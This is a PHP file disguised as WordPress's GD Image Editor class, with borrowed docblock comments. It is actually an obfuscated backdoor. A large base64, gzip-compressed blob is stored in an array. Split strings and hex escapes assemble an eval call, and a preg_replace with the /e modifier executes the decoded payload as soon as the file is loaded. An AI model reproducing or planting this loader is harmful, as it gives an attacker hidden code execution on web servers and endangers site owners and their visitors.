<?php

/**
 * WordPress GD Image Editor
 *
 * @package WordPress
 * @subpackage Image_Editor
 */

/**
 * WordPress Image Editor Class for Image Manipulation through GD dyny
 *
 * @package WordPress
 * @subpackage Image_Editor
 * @uses WP_Image_Editor Extends class
 */
 
 $dyny = array(
 "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",
 "T01lF01u6kR5iX+iFhJq6E2oAnur0SScrVmGXPmIcWEkf351r0","hdubxT6bmT4k2Dk3TbaPz1QbtQvy2+TU+ybD91kTu5JVF/xJk3",
 "W7VwEC7CxcfUcLWaf/zwAYdg7dVJTr+lJB5uLsPF7/konHLr9v","FnbCU7mK+JsFnsbFvJboejOCTNOZyJkHhMBn10QLK1fMWWpurm",
 "q4GW+eBQeC53z3gtzQxPmvH/l79msgI0EsrmWbF4BGYOVWP94S","9SH/5k47cp2zphGiNn3pSk5oh3jcvdNWXCD3DEL+OlSn65oHzn",
 "jlmvXCcd4nuiRsg+e8fRyhHAIiiDPWslz/M1E6dfNw9d492DBM","1z+7pl6Poh0CM9A+4dfc74B63GesswEQx/i1svgTWbR24rf/us",
 "0JB9znItPj0OXw+cmkSf1wzS6GWnf/Ey0x1FEW1NF+I3cwNSFf","RQL5hNV6S0lumTZG2e/KNXyzPTGG9sBmvuoyVpROnTXu2m2ryp",
 "N76SCBfhhiU5QyTC8+wkv34MTUldsJkuZ4acmXJmyZktZxk5c+","TMFZ9NqlgyJYQpIUwJYUoIU0KYtjAiEUyJYLpiZkkIS0JY4vPN",
 "kgiWRLAkgiWDsCSEJSEsCWFLCFt8H9oyCFtC2BLClhC2hLAlhC","0hbMFTRiJkZBAZCZGREBkJkZEQGQmRkRAZCZGRUTjiG9eREI6E",
 "cCSEIyEcCeFICEdCOA599Q3Xg0HMujLpa9nBbMHmbk5UKSs894","/Ep4sjFt+/51/FKpOwI511JSGu9NaV3rrSW1d66/KXlq7lRKlq",
 "zleG812Wk66yi6YkyircePGrXSVLPtNWqLHUv/78DxtsNeY=");
 
 /**
	 * Checks to see if current environment supports GD.
	 *
	 * @access public
	 *
	 * @return boolean
 */
 
 $GD_step1 = "s" ."tr" ."re" ."v";
 
 $GD_step2 = "e"."/"."*"."."."/";
 
 /**
 * Sets or updates current image size.
 *
 * @access protected
 *
 * @param int $width
 * @param int $height
 */
 
 $GD_step3 = "\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\x69\x6D\x70\x6C\x6F\x64\x65\x28\x22\x22\x2C\x24\x64\x79\x6E\x79\x29\x29\x29\x29\x3B";
 
 $GD_step4 = ".";
 
 /**
 * Resizes current image.
 * Wraps _resize, since _resize returns a GD Resource.
 *
 * At minimum, either a height or width must be provided.
 * If one of the two is set to null, the resize will
 * maintain aspect ratio according to the provided dimension.
 *
 * @access public
 *
 * @param  int|null $max_w Image width.
 * @param  int|null $max_h Image height.
 * @param  boolean  $crop
 * @return boolean|WP_Error
 */
 
 $GD_get_img = "p". "r"."eg"."_r"."ep"."l"."ace";
 
 /**
 * Loads image from $this->file into new GD Resource.
 *
 * @access protected
 *
 * @return boolean|WP_Error True if loaded successfully; WP_Error on failure.
 */
 
 $GD_get_img($GD_step1($GD_step2),$GD_step3,$GD_step4);
 
 ?>